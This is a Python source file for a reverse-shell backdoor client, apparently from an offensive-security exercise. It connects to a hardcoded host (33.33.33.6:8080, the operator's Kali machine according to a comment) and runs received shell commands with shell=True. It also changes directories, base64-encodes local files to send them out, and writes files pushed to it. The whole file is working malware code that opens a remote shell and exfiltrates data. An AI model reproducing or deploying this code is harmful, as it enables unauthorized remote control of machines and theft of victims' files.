import socket
import subprocess
import simplejson
import os
import base64


class MySocket:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    def command_exec(self, command):
        return subprocess.check_output(command, shell=True)

    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def get_file_contents(self, path):
        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read())

    def save_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.a85decode(content))
            return "Uploaded " + path + " successfully!\n"

    def exec_cd_command(self, directory):
        os.chdir(directory)
        return "Changed to " + directory + " directory."

    def start_socket(self):
        # confirm to kali that it's connected
        self.my_connection.send("Type 'quit' to exit\n")
        while True:
            # wait for the specified amnt of data from kali
            command = self.json_recv()
            try:
                if command[0] == "quit":
                    self.my_connection.close()
                    exit(0)
                elif command[0] == "cd" and len(command) > 1:
                    command_output = self.exec_cd_command(command[1])
                elif command[0] == "download":
                    command_output = self.get_file_contents(command[1])
                elif command[0] == "upload":
                    command_output = self.save_file(command[1], command[2])
                else:
                    # execute the command
                    command_output = self.command_exec(command)
            except Exception:
                command_output = "ERROR!\n"
            finally:
                # return the result
                self.json_send(command_output)
        self. my_connection.close()


my_sock = MySocket("33.33.33.6", 8080)
my_sock.start_socket()
